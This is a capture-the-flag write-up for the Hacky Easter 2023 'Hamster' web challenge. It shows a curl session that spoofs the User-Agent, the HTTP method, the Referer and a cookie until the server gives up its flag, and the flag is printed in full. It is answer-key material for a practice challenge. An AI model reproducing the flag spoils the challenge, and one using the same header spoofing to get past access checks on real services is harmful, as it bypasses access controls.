# Description

# Hamster

The Hamster has a flag for you.

<http://ch.hackyeaster.com:2301>

Note: The service is restarted every hour at x:00.

# Hints

curl is your friend.

# Solution

again the same hsts error, dunno why...

after googeling i got to <chrome://net-internals/#hsts> and entered "hackyeaster.com" to be deleted, this worked..

well this challenge is just doing what you are told, and using curl:

```
$ curl http://ch.hackyeaster.com:2301/
Howdy, I am the hamster.Please go to /feed
$ curl http://ch.hackyeaster.com:2301/feed
🕴 only hamster-agent is allowed
$ curl -A "hamster-agent" http://ch.hackyeaster.com:2301/feed
⛳ GET invalid
$ curl -A "hamster-agent" -X POST http://ch.hackyeaster.com:2301/feed
⛳ POST invalid
$ curl -A "hamster-agent" -X HEAD http://ch.hackyeaster.com:2301/feed
Warning: Setting custom HTTP method to HEAD with -X/--request may not work the 
Warning: way you want. Consider using -I/--head instead.

^C
$ curl -A "hamster-agent" -X PUT http://ch.hackyeaster.com:2301/feed
🛑 request must come from hackyhamster.org
$ curl -A "hamster-agent" -X PUT --referer hackyhamster.org http://ch.hackyeaster.com:2301/feed
🍪 brownie not found
$ curl -A "hamster-agent" -X PUT --referer hackyhamster.org -i http://ch.hackyeaster.com:2301/feed
HTTP/1.1 200 OK
Date: Wed, 05 Apr 2023 23:47:44 GMT
Content-Length: 23
Content-Type: text/plain; charset=utf-8

🍪 brownie not found
$ curl -A "hamster-agent" -X PUT --referer hackyhamster.org --cookie "brownie=asdf" http://ch.hackyeaster.com:2301/feed
🍪 brownie must be baked
$ curl -A "hamster-agent" -X PUT --referer hackyhamster.org --cookie "brownie=baked" http://ch.hackyeaster.com:2301/feed
🚩 he2023{s1mpl3_h34d3r_t4mp3r1ng}
```

# FLAG: he2023{s1mpl3_h34d3r_t4mp3r1ng}
